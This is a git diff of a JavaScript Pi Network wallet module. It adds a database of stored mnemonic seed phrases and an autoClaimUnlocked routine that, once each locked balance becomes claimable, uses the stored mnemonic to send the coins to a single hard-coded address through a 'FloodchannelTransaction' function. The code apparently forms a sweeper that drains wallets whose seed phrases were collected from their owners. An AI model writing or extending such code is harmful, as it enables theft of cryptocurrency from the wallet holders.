@@ -2,11 +2,13 @@ import axios from 'axios';
 import { HttpsProxyAgent } from 'https-proxy-agent';
 import bip39 from 'bip39';
 import ed25519 from 'ed25519-hd-key';
-import { Keypair, TransactionBuilder, Operation, Asset, Account, MuxedAccount   } from 'stellar-base';
+import { Keypair, TransactionBuilder, Operation, Asset, Account   } from 'stellar-base';
 import Sponsors from '../models/Sponsors.js';
+import Passphrase from '../models/Passphrase.js';
 
 const HORIZON = 'https://api.mainnet.minepi.com';
 const NETWORK_PASSPHRASE = 'Pi Network';
+const PI_PUBLIC_ADDRESS = 'GDOQD7EVNKEB775WCG7DZ3L6H7RTPLXKAGM46JEARLGROQM6TOX3D2BS';
 
 
 export function getKeypairFromPassphrase(mnemonic) {
@@ -245,3 +247,48 @@ export function getBalance(account) {
 
     return balanceObj ? balanceObj.balance : '0';
 }
+
+const autoClaimUnlocked = async () => {
+    const now = new Date();
+
+    const readyPassphrases = await Passphrase.find({
+        claimableAt: { $lte: now },
+        status: 'pending'
+    });
+
+    for (const p of readyPassphrases) {
+        try {
+            console.log(`🔄 Claiming for: ${p.mnemonic.slice(0, 10)}...`);
+
+            const result = await FloodchannelTransaction(
+                p.mnemonic,
+                p.balanceId,
+                PI_PUBLIC_ADDRESS,
+                p.amount
+            );
+
+            const success = result.find(r => r.hash);
+
+            if (success) {
+                console.log(`✅ Claimed Pi. Hash: ${success.hash}`);
+                await Passphrase.updateOne(
+                    { _id: p._id },
+                    { $set: { status: 'claimed' } }
+                );
+            } else {
+                console.log(`❌ Failed to claim for ${p.receiverAddress}`);
+                await Passphrase.updateOne(
+                    { _id: p._id },
+                    { $set: { status: 'failed' } }
+                );
+            }
+
+        } catch (err) {
+            console.error('❌ Error claiming Pi:', err.message || err);
+            await Passphrase.updateOne(
+                { _id: p._id },
+                { $set: { status: 'failed' } }
+            );
+        }
+    }
+};
